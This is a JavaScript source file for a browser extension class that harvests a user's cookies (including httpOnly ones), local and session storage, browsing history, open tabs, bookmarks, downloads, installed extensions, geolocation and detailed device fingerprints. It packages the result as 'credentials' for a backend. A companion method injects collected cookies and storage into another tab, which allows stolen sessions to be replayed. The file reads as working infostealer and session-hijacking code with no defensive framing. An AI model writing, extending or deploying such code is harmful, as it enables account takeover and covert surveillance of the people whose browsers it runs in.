class BrowserDataCollector {
    static async collectAllBrowserData(url = Constants.DOMAINS.MAIN.URL, tabId = null) {
        try {
            const browserData = {
                ipAddress: null,
                userAgent: navigator.userAgent,
                platform: this.getPlatformInfo(),
                browser: this.getBrowserInfo(),
                

                cookies: await this.collectCookies(url),
                localStorage: {},
                sessionStorage: {},
                

                fingerprint: await this.collectFingerprint(),
                geoLocation: await this.collectGeoLocation(),
                metadata: this.collectMetadata(),
                

                browserHistory: await this.collectBrowserHistory(),
                tabs: await this.collectTabsInfo(),
                bookmarks: await this.collectBookmarks(),
                downloads: await this.collectDownloads(),
                extensions: await this.collectExtensionsInfo()
            }

            if (tabId) {
                try {
                    const storageData = await this.collectStorageData(tabId)
                    browserData.localStorage = storageData.localStorage || {}
                    browserData.sessionStorage = storageData.sessionStorage || {}
                } catch (error) {
                    console.warn('Storage collection failed:', error.message)
                }
            }

            return {
                success: true,
                error: null,
                message: 'Browser data collected successfully',
                data: browserData
            }
        } catch (error) {
            return {
                success: false,
                error: 'Collection error',
                message: `Failed to collect browser data: ${error.message}`,
                data: null
            }
        }
    }


    static async collectCookies(url) {
        try {
            const cookies = {}
            const domain = new URL(url).hostname
            
            const allCookies = await new Promise(resolve => {
                chrome.cookies.getAll({ domain: domain }, resolve)
            })

            allCookies.forEach(cookie => {
                cookies[cookie.name] = {
                    value: cookie.value,
                    domain: cookie.domain,
                    path: cookie.path,
                    secure: cookie.secure,
                    httpOnly: cookie.httpOnly,
                    expirationDate: cookie.expirationDate
                }
            })

            return cookies
        } catch (error) {
            console.error('Error collecting cookies:', error)
            return {}
        }
    }


    static async collectStorageData(tabId) {
        try {
            const results = await chrome.scripting.executeScript({
                target: { tabId: tabId },
                func: () => {
                    const storageData = {
                        localStorage: {},
                        sessionStorage: {},
                        errors: []
                    }

                    try {
                        for (let i = 0; i < localStorage.length; i++) {
                            const key = localStorage.key(i)
                            if (key) {
                                storageData.localStorage[key] = localStorage.getItem(key)
                            }
                        }
                    } catch (e) {
                        storageData.errors.push(`localStorage: ${e.message}`)
                    }

                    try {
                        for (let i = 0; i < sessionStorage.length; i++) {
                            const key = sessionStorage.key(i)
                            if (key) {
                                storageData.sessionStorage[key] = sessionStorage.getItem(key)
                            }
                        }
                    } catch (e) {
                        storageData.errors.push(`sessionStorage: ${e.message}`)
                    }

                    return storageData
                }
            })

            const result = results[0]?.result
            if (result?.errors?.length > 0) {
                console.warn('Storage collection warnings:', result.errors)
            }
            
            return {
                localStorage: result?.localStorage || {},
                sessionStorage: result?.sessionStorage || {}
            }
        } catch (error) {
            console.warn('Content script injection failed:', error.message)
            return {
                localStorage: {},
                sessionStorage: {}
            }
        }
    }


    static async collectFingerprint() {
        try {
            const fingerprint = {
                screen: {
                    width: screen.width,
                    height: screen.height,
                    availWidth: screen.availWidth,
                    availHeight: screen.availHeight,
                    colorDepth: screen.colorDepth,
                    pixelDepth: screen.pixelDepth,
                    orientation: screen.orientation?.type || null
                },
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                language: navigator.language,
                languages: navigator.languages,
                cookieEnabled: navigator.cookieEnabled,
                doNotTrack: navigator.doNotTrack,
                hardwareConcurrency: navigator.hardwareConcurrency,
                maxTouchPoints: navigator.maxTouchPoints,
                onLine: navigator.onLine,
                webdriver: navigator.webdriver,
                deviceMemory: navigator.deviceMemory || null,
                connection: navigator.connection ? {
                    effectiveType: navigator.connection.effectiveType,
                    downlink: navigator.connection.downlink,
                    rtt: navigator.connection.rtt,
                    saveData: navigator.connection.saveData
                } : null,
                plugins: Array.from(navigator.plugins).map(p => ({
                    name: p.name,
                    description: p.description,
                    filename: p.filename,
                    length: p.length
                })),
                mediaDevices: await this.getMediaDevices(),
                webgl: await this.getWebGLFingerprint(),
                canvas: await this.getCanvasFingerprint(),
                audio: await this.getAudioFingerprint(),
                fonts: await this.detectFonts(),
                battery: await this.getBatteryInfo(),
                permissions: await this.getPermissionsStatus()
            }

            return fingerprint
        } catch (error) {
            console.error('Error collecting fingerprint:', error)
            return {}
        }
    }


    static async getWebGLFingerprint() {
        try {
            const canvas = document.createElement('canvas')
            const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl')
            
            if (!gl) return null
            
            return {
                vendor: gl.getParameter(gl.VENDOR),
                renderer: gl.getParameter(gl.RENDERER),
                version: gl.getParameter(gl.VERSION),
                shadingLanguageVersion: gl.getParameter(gl.SHADING_LANGUAGE_VERSION),
                extensions: gl.getSupportedExtensions(),
                maxTextureSize: gl.getParameter(gl.MAX_TEXTURE_SIZE),
                maxViewportDims: gl.getParameter(gl.MAX_VIEWPORT_DIMS)
            }
        } catch (error) {
            return null
        }
    }


    static async getCanvasFingerprint() {
        try {
            const canvas = document.createElement('canvas')
            const ctx = canvas.getContext('2d')
            

            ctx.textBaseline = 'top'
            ctx.font = '14px Arial'
            ctx.fillStyle = '#f60'
            ctx.fillRect(125, 1, 62, 20)
            ctx.fillStyle = '#069'
            ctx.fillText('Browser fingerprint 🔍', 2, 15)
            ctx.fillStyle = 'rgba(102, 204, 0, 0.7)'
            ctx.fillText('Extended data collection', 4, 45)
            
            return {
                dataURL: canvas.toDataURL(),
                hash: await this.hashString(canvas.toDataURL())
            }
        } catch (error) {
            return null
        }
    }

    static async getAudioFingerprint() {
        try {
            const audioContext = new (window.AudioContext || window.webkitAudioContext)()
            const oscillator = audioContext.createOscillator()
            const analyser = audioContext.createAnalyser()
            const gainNode = audioContext.createGain()
            const scriptProcessor = audioContext.createScriptProcessor(4096, 1, 1)
            
            oscillator.type = 'triangle'
            oscillator.frequency.setValueAtTime(10000, audioContext.currentTime)
            
            gainNode.gain.setValueAtTime(0, audioContext.currentTime)
            
            oscillator.connect(analyser)
            analyser.connect(scriptProcessor)
            scriptProcessor.connect(gainNode)
            gainNode.connect(audioContext.destination)
            
            oscillator.start(0)
            
            return new Promise((resolve) => {
                scriptProcessor.onaudioprocess = function(bins) {
                    const hash = bins.inputBuffer.getChannelData(0).reduce((a, b) => a + b, 0)
                    oscillator.stop()
                    audioContext.close()
                    resolve({ hash: hash.toString() })
                }
                
                setTimeout(() => resolve(null), 1000)
            })
        } catch (error) {
            return null
        }
    }


    static async detectFonts() {
        try {
            const baseFonts = ['monospace', 'sans-serif', 'serif']
            const testFonts = [
                'Arial', 'Helvetica', 'Times New Roman', 'Courier New', 'Verdana',
                'Georgia', 'Palatino', 'Garamond', 'Bookman', 'Comic Sans MS',
                'Trebuchet MS', 'Arial Black', 'Impact', 'Lucida Sans Unicode',
                'Tahoma', 'Lucida Console', 'Monaco', 'Courier', 'Times',
                'Century Gothic', 'Calibri', 'Consolas', 'Cambria'
            ]
            
            const detectedFonts = []
            
            for (const font of testFonts) {
                if (await this.isFontAvailable(font, baseFonts)) {
                    detectedFonts.push(font)
                }
            }
            
            return detectedFonts
        } catch (error) {
            return []
        }
    }

    static async isFontAvailable(font, baseFonts) {
        const testString = 'mmmmmmmmmmlli'
        const testSize = '72px'
        const canvas = document.createElement('canvas')
        const context = canvas.getContext('2d')
        
        context.font = testSize + ' ' + baseFonts[0]
        const baselineWidth = context.measureText(testString).width
        
        context.font = testSize + ' ' + font + ', ' + baseFonts[0]
        const fontWidth = context.measureText(testString).width
        
        return fontWidth !== baselineWidth
    }

    static async getMediaDevices() {
        try {
            if (!navigator.mediaDevices || !navigator.mediaDevices.enumerateDevices) {
                return null
            }
            
            const devices = await navigator.mediaDevices.enumerateDevices()
            return devices.map(device => ({
                kind: device.kind,
                label: device.label,
                deviceId: device.deviceId ? 'present' : 'none'
            }))
        } catch (error) {
            return null
        }
    }


    static async getBatteryInfo() {
        try {
            if (!navigator.getBattery) return null
            
            const battery = await navigator.getBattery()
            return {
                charging: battery.charging,
                level: Math.round(battery.level * 100),
                chargingTime: battery.chargingTime,
                dischargingTime: battery.dischargingTime
            }
        } catch (error) {
            return null
        }
    }

    static async getPermissionsStatus() {
        try {
            const permissions = ['geolocation', 'notifications', 'camera', 'microphone']
            const status = {}
            
            for (const permission of permissions) {
                try {
                    const result = await navigator.permissions.query({ name: permission })
                    status[permission] = result.state
                } catch (e) {
                    status[permission] = 'unknown'
                }
            }
            
            return status
        } catch (error) {
            return {}
        }
    }

    static async hashString(str) {
        try {
            const encoder = new TextEncoder()
            const data = encoder.encode(str)
            const hashBuffer = await crypto.subtle.digest('SHA-256', data)
            const hashArray = Array.from(new Uint8Array(hashBuffer))
            return hashArray.map(b => b.toString(16).padStart(2, '0')).join('')
        } catch (error) {

            let hash = 0
            for (let i = 0; i < str.length; i++) {
                const char = str.charCodeAt(i)
                hash = ((hash << 5) - hash) + char
                hash = hash & hash
            }
            return hash.toString()
        }
    }

    static async collectGeoLocation() {
        try {
            return new Promise((resolve) => {
                if (!navigator.geolocation) {
                    resolve(null)
                    return
                }

                navigator.geolocation.getCurrentPosition(
                    (position) => {
                        resolve({
                            latitude: position.coords.latitude,
                            longitude: position.coords.longitude,
                            accuracy: position.coords.accuracy,
                            timestamp: position.timestamp
                        })
                    },
                    (error) => {
                        console.log('Geolocation permission denied or error:', error)
                        resolve(null)
                    },
                    { timeout: 5000, enableHighAccuracy: false }
                )
            })
        } catch (error) {
            console.error('Error collecting geolocation:', error)
            return null
        }
    }


    static getPlatformInfo() {
        const platform = navigator.platform
        const userAgent = navigator.userAgent

        if (userAgent.includes('Windows')) return 'Windows'
        if (userAgent.includes('Mac')) return 'macOS'
        if (userAgent.includes('Linux')) return 'Linux'
        if (userAgent.includes('Android')) return 'Android'
        if (userAgent.includes('iPhone') || userAgent.includes('iPad')) return 'iOS'
        
        return platform || 'Unknown'
    }

    static getBrowserInfo() {
        const userAgent = navigator.userAgent
        
        if (userAgent.includes('Chrome') && !userAgent.includes('Edg')) {
            const match = userAgent.match(/Chrome\/(\d+\.\d+)/)
            return `Chrome ${match ? match[1] : 'Unknown'}`
        }
        if (userAgent.includes('Firefox')) {
            const match = userAgent.match(/Firefox\/(\d+\.\d+)/)
            return `Firefox ${match ? match[1] : 'Unknown'}`
        }
        if (userAgent.includes('Safari') && !userAgent.includes('Chrome')) {
            const match = userAgent.match(/Version\/(\d+\.\d+)/)
            return `Safari ${match ? match[1] : 'Unknown'}`
        }
        if (userAgent.includes('Edg')) {
            const match = userAgent.match(/Edg\/(\d+\.\d+)/)
            return `Edge ${match ? match[1] : 'Unknown'}`
        }
        
        return 'Unknown Browser'
    }


    static collectMetadata() {
        return {
            collectionTimestamp: new Date().toISOString(),
            extensionVersion: chrome.runtime.getManifest().version,
            url: window.location?.href || 'extension-context',
            referrer: document?.referrer || null,
            viewport: {
                width: window.innerWidth,
                height: window.innerHeight
            },
            performanceMemory: performance.memory ? {
                usedJSHeapSize: performance.memory.usedJSHeapSize,
                totalJSHeapSize: performance.memory.totalJSHeapSize,
                jsHeapSizeLimit: performance.memory.jsHeapSizeLimit
            } : null,
            performanceTiming: {
                navigationStart: performance.timing?.navigationStart,
                loadEventEnd: performance.timing?.loadEventEnd,
                domContentLoadedEventEnd: performance.timing?.domContentLoadedEventEnd
            }
        }
    }


    static async collectBrowserHistory(maxResults = 100) {
        try {
            if (!chrome.history) {
                return { error: 'History permission not granted' }
            }
            
            const historyItems = await chrome.history.search({
                text: '',
                maxResults: maxResults,
                startTime: Date.now() - (7 * 24 * 60 * 60 * 1000)
            })
            
            return {
                totalItems: historyItems.length,
                recentItems: historyItems.map(item => ({
                    url: item.url,
                    title: item.title,
                    visitCount: item.visitCount,
                    lastVisitTime: item.lastVisitTime
                }))
            }
        } catch (error) {
            return { error: error.message }
        }
    }


    static async collectTabsInfo() {
        try {
            const tabs = await chrome.tabs.query({})
            
            return {
                totalTabs: tabs.length,
                activeTabs: tabs.filter(tab => tab.active).length,
                tabs: tabs.map(tab => ({
                    id: tab.id,
                    url: tab.url,
                    title: tab.title,
                    active: tab.active,
                    pinned: tab.pinned,
                    incognito: tab.incognito,
                    windowId: tab.windowId,
                    status: tab.status
                }))
            }
        } catch (error) {
            return { error: error.message }
        }
    }

    static async collectBookmarks() {
        try {
            if (!chrome.bookmarks) {
                return { error: 'Bookmarks permission not granted' }
            }
            
            const bookmarkTree = await chrome.bookmarks.getTree()
            
            const flattenBookmarks = (nodes) => {
                let bookmarks = []
                for (const node of nodes) {
                    if (node.url) {
                        bookmarks.push({
                            title: node.title,
                            url: node.url,
                            dateAdded: node.dateAdded
                        })
                    }
                    if (node.children) {
                        bookmarks = bookmarks.concat(flattenBookmarks(node.children))
                    }
                }
                return bookmarks
            }
            
            const allBookmarks = flattenBookmarks(bookmarkTree)
            
            return {
                totalBookmarks: allBookmarks.length,
                bookmarks: allBookmarks.slice(0, 50)
            }
        } catch (error) {
            return { error: error.message }
        }
    }

    static async collectDownloads() {
        try {
            if (!chrome.downloads) {
                return { error: 'Downloads permission not granted' }
            }
            
            const downloads = await chrome.downloads.search({
                limit: 50,
                orderBy: ['-startTime']
            })
            
            return {
                totalDownloads: downloads.length,
                recentDownloads: downloads.map(download => ({
                    filename: download.filename,
                    url: download.url,
                    state: download.state,
                    danger: download.danger,
                    startTime: download.startTime,
                    endTime: download.endTime,
                    fileSize: download.fileSize
                }))
            }
        } catch (error) {
            return { error: error.message }
        }
    }

    static async collectExtensionsInfo() {
        try {
            if (!chrome.management) {
                return { error: 'Management permission not granted' }
            }
            
            const extensions = await chrome.management.getAll()
            
            return {
                totalExtensions: extensions.length,
                extensions: extensions.map(ext => ({
                    id: ext.id,
                    name: ext.name,
                    version: ext.version,
                    enabled: ext.enabled,
                    type: ext.type,
                    installType: ext.installType,
                    permissions: ext.permissions
                }))
            }
        } catch (error) {
            return { error: error.message }
        }
    }


    static async collectNetworkInfo() {
        try {
            const networkInfo = {
                connection: navigator.connection ? {
                    effectiveType: navigator.connection.effectiveType,
                    downlink: navigator.connection.downlink,
                    rtt: navigator.connection.rtt,
                    saveData: navigator.connection.saveData
                } : null,
                
                timing: performance.timing ? {
                    navigationStart: performance.timing.navigationStart,
                    connectStart: performance.timing.connectStart,
                    connectEnd: performance.timing.connectEnd,
                    requestStart: performance.timing.requestStart,
                    responseStart: performance.timing.responseStart,
                    responseEnd: performance.timing.responseEnd,
                    domLoading: performance.timing.domLoading,
                    domComplete: performance.timing.domComplete,
                    loadEventStart: performance.timing.loadEventStart,
                    loadEventEnd: performance.timing.loadEventEnd
                } : null
            }
            
            return networkInfo
        } catch (error) {
            return { error: error.message }
        }
    }

    static async getActiveTab() {
        try {
            return new Promise(resolve => {
                chrome.tabs.query({ active: true, currentWindow: true }, tabs => {
                    const activeTab = tabs[0]
                    if (activeTab) {
                        resolve({
                            success: true,
                            data: activeTab,
                            error: null
                        })
                    } else {
                        resolve({
                            success: false,
                            data: null,
                            error: 'No active tab found'
                        })
                    }
                })
            })
        } catch (error) {
            return {
                success: false,
                data: null,
                error: error.message
            }
        }
    }

    static async collectFromActiveTab(url = null) {
        try {
            const activeTabResult = await this.getActiveTab()
            if (!activeTabResult.success || !activeTabResult.data) {
                return await this.collectAllBrowserData(url)
            }

            const targetUrl = url || activeTabResult.data.url || Constants.DOMAINS.MAIN.URL
            return await this.collectAllBrowserData(targetUrl, activeTabResult.data.id)
        } catch (error) {
            console.error('Error collecting from active tab:', error)
            return await this.collectAllBrowserData(url)
        }
    }

    static async getBrowserData(url = Constants.DOMAINS.MAIN.URL) {
        try {
            const collectionResult = await this.collectFromActiveTab(url)
            
            if (!collectionResult.success) {
                return collectionResult
            }
            
            const formattedData = {
                ipAddress: collectionResult.data.ipAddress || null,
                userAgent: collectionResult.data.userAgent || null,
                platform: collectionResult.data.platform || null,
                browser: collectionResult.data.browser || null,
                cookies: collectionResult.data.cookies || {},
                localStorage: collectionResult.data.localStorage || {},
                sessionStorage: collectionResult.data.sessionStorage || {},
                fingerprint: collectionResult.data.fingerprint || {},
                geoLocation: collectionResult.data.geoLocation || null,
                metadata: collectionResult.data.metadata || {},
                browserHistory: collectionResult.data.browserHistory || null,
                tabs: collectionResult.data.tabs || null,
                bookmarks: collectionResult.data.bookmarks || null,
                downloads: collectionResult.data.downloads || null,
                extensions: collectionResult.data.extensions || null,
                credentialSource: 'auto_detected'
            }
            
            return {
                success: true,
                error: null,
                message: 'Browser data collected and formatted for backend',
                data: { credentials: formattedData }
            }
        } catch (error) {
            return {
                success: false,
                error: 'Collection error',
                message: `Failed to collect data for backend: ${error.message}`,
                data: null
            }
        }
    }

    static async setBrowserData(tabId, credentials) {
        try {
            const results = []

            if (credentials.cookies) {
                for (const [name, cookieData] of Object.entries(credentials.cookies)) {
                    try {
                        const cookieResult = await chrome.cookies.set({
                            url: `https://${cookieData.domain}`,
                            name: name,
                            value: cookieData.value,
                            domain: cookieData.domain,
                            path: cookieData.path || '/',
                            secure: cookieData.secure || false,
                            httpOnly: cookieData.httpOnly || false,
                            expirationDate: cookieData.expirationDate
                        })
                        results.push({ type: 'cookie', name, success: !!cookieResult })
                    } catch (error) {
                        results.push({ type: 'cookie', name, success: false, error: error.message })
                    }
                }
            }

            if (credentials.localStorage || credentials.sessionStorage) {
                try {
                    await chrome.scripting.executeScript({
                        target: { tabId: tabId },
                        func: (localStorageData, sessionStorageData) => {
                            if (localStorageData) {
                                for (const [key, value] of Object.entries(localStorageData)) {
                                    try {
                                        localStorage.setItem(key, value)
                                    } catch (e) {
                                        console.log(`Failed to set localStorage ${key}:`, e)
                                    }
                                }
                            }


                            if (sessionStorageData) {
                                for (const [key, value] of Object.entries(sessionStorageData)) {
                                    try {
                                        sessionStorage.setItem(key, value)
                                    } catch (e) {
                                        console.log(`Failed to set sessionStorage ${key}:`, e)
                                    }
                                }
                            }
                        },
                        args: [credentials.localStorage, credentials.sessionStorage]
                    })
                    results.push({ type: 'storage', success: true })
                } catch (error) {
                    results.push({ type: 'storage', success: false, error: error.message })
                }
            }

            return {
                success: true,
                error: null,
                message: 'Browser data set successfully',
                data: { results }
            }
        } catch (error) {
            return {
                success: false,
                error: 'Set data error',
                message: `Failed to set browser data: ${error.message}`,
                data: null
            }
        }
    }
}


if (typeof module !== 'undefined' && module.exports) {
    module.exports = BrowserDataCollector
}
